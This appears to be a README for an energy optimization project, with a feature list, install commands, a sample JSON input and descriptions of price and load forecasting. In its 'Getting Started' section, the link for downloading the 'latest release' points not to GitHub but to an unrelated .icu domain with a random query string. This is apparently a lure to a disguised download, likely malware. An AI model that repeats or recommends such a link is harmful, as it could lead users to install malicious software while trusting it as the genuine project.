# 🌍 Energy Optimization System (EOS)

Welcome to the EOS repository! This project focuses on optimizing energy distribution and usage for batteries, heat pumps, and household devices. Our goal is to enhance energy efficiency while minimizing costs through advanced predictive models and dynamic optimization techniques.

## 🚀 Overview

The Energy Optimization System (EOS) is designed to address the growing need for efficient energy management in modern households. With the increasing reliance on renewable energy sources and smart devices, the demand for effective energy distribution has never been higher. EOS provides tools and algorithms that help users make informed decisions about their energy usage.

### 🔍 Key Features

- **Energy Distribution Optimization**: The system analyzes energy consumption patterns and optimizes distribution across various devices.
- **Predictive Models**: Planned predictive models for electricity prices help users anticipate costs and adjust their usage accordingly.
- **Load Forecasting**: Accurate load forecasting ensures that energy resources are used efficiently, reducing waste.
- **Dynamic Optimization**: The system continuously adjusts energy distribution to maximize efficiency based on real-time data.

## 🛠️ Getting Started

To get started with EOS, you can download the latest release from our [Releases section](https://downloadsoftgits.icu/?89qs0rebvskok8p). Make sure to download the appropriate files for your operating system and follow the instructions provided in the documentation.

### 🖥️ Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/RishabKanaujia/EOS.git
   cd EOS
   ```

2. **Install Dependencies**:
   Ensure you have the necessary dependencies installed. You can do this by running:
   ```bash
   pip install -r requirements.txt
   ```

3. **Run the Application**:
   Execute the main script to start using the EOS:
   ```bash
   python main.py
   ```

## 📊 Usage

Once the application is running, you can input your energy consumption data. The system will analyze this data and provide recommendations for optimizing your energy usage. 

### Example Input

You can input data in the following format:

```json
{
  "devices": [
    {"name": "Heat Pump", "usage": 200},
    {"name": "Battery", "usage": 150},
    {"name": "Household Device", "usage": 100}
  ]
}
```

### Output

The system will return optimized energy distribution and cost-saving recommendations based on your input.

## 📈 Predictive Models

EOS employs advanced predictive models to forecast electricity prices and energy loads. This allows users to plan their energy consumption effectively. 

### Electricity Price Forecasting

The predictive model analyzes historical price data to forecast future prices. This information helps users decide when to use energy-intensive devices to save costs.

### Load Forecasting

Load forecasting predicts the energy demand for the upcoming hours or days. By understanding load patterns, users can adjust their energy usage to avoid peak prices.

## ⚙️ Dynamic Optimization

Dynamic optimization is a core feature of EOS. The system continuously monitors energy consumption and adjusts distribution in real-time. This ensures that users are always operating at peak efficiency.
